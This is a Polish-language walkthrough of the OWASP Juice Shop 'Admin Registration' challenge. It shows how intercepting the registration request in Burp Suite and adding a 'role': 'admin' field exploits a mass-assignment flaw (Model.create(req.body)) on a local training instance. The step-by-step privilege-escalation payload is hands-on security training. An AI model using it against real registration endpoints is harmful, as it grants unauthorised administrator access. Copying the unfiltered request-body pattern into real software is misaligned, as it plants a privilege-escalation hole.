Zadanie **Admin Registration (Mass Assignment)** polega na wykorzystaniu podatności w backendzie, który bez filtracji przyjmuje cały obiekt JSON przekazany przez klienta i zapisuje jego właściwości bezpośrednio w bazie danych (`Model.create(req.body)`). Dopisanie pola `"role": "admin"` do formularza rejestracji pozwala na nadanie uprawnień administratora nowemu kontu.

1. **Otwórz formularz rejestracji:** Strona http://localhost:3000/#/register.
Wypełnij pola formularza rejestracyjnego (adres e-mail, hasło oraz odpowiedź na pytanie pomocnicze), ale **nie klikaj** jeszcze przycisku finalizującego rejestrację.


2. **Włącz przechwytywanie żądań HTTP:**
W **Burp Suite** przejdź do zakładki *Proxy -> Intercept* i włącz opcję **Intercept is on** (lub przygotuj narzędzia deweloperskie przeglądarki na przechwycenie żądania).


3. **Wyślij formularz i przechwyć żądanie API:**
Kliknij przycisk **Register** w interfejsie Juice Shop. Przechwycone w Burp Suite żądanie wywoła metodę `POST /api/Users/` z domyślnym payloadem JSON:

```json
{
  "email": "new_admin@domain.com",
  "password": "password123",
  "passwordRepeat": "password123",
  "securityQuestion": {
    "id": 1,
    "question": "Your eldest sibling's middle name?"
  },
  "securityAnswer": "test"
}

```


4. **Dopisz pole uprawnień do obiektu JSON:** Wykorzystanie podatności Mass Assignment.
Edytuj treść przechwyconego żądania w Burp Suite, dopisując na końcu obiektu JSON właściwość `"role": "admin"`:

```json
{
  "email": "new_admin@domain.com",
  "password": "password123",
  "passwordRepeat": "password123",
  "securityQuestion": {
    "id": 1,
    "question": "Your eldest sibling's middle name?"
  },
  "securityAnswer": "test",
  "role": "admin"
}

```


5. **Przepuść żądanie do serwera:**
Kliknij **Forward** w Burp Suite. Serwer przetworzy żądanie i zwróci odpowiedź ze statusem **201 Created**, w której w obiekcie użytkownika pole `role` będzie miało wartość `"admin"`.


6. **Potwierdź dostęp administracyjny:**
Zaloguj się w sklepie przy użyciu zarejestrowanego adresu e-mail i hasła. W bocznym menu nawigacyjnym zobaczysz nową pozycję **Administration** (`/#/administration`), a w aplikacji wyzwoli się powiadomienie o zaliczeniu zadania.
